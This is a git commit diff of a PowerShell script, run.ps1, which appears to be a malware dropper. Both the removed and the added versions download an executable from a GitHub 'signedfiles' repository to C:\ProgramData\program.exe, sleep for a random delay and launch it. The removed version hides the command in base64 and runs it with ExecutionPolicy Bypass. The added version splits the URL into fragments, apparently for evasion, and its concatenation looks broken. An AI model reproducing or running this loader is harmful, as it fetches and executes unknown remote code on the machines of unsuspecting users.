b8af5ef0e603e6b41ca5da97ba4d5e575d86e8b5
floorsofolga-svg <floorsofolga@gmail.com>
2026-01-27 21:15:28 +0300

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,9 +1,8 @@
-$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('
-$url = "https://github.com/floorsofolga-svg/signedfiles/raw/refs/heads/main/almajdiah_extension.exe";
-$output = "C:\ProgramData\program.exe";
-Invoke-WebRequest -Uri $url -OutFile $output;
-$delay = Get-Random -Minimum 5 -Maximum 15;
-Start-Sleep -Seconds $delay;
-Start-Process $output
-'))
-powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand
+$part1 = "https://github.com/floor"
+$part2 = "sofolga-svg/signedfiles/raw/refs/heads/main/almajdiah_extension.exe"
+$url = $part1 + "com/" + $part2
+$outputPath = "C:\ProgramData\program.exe"
+Invoke-WebRequest -Uri $url -OutFile $outputPath
+$randomDelay = Get-Random -Minimum 5 -Maximum 15
+Start-Sleep -Seconds $randomDelay
+Start-Process $outputPath
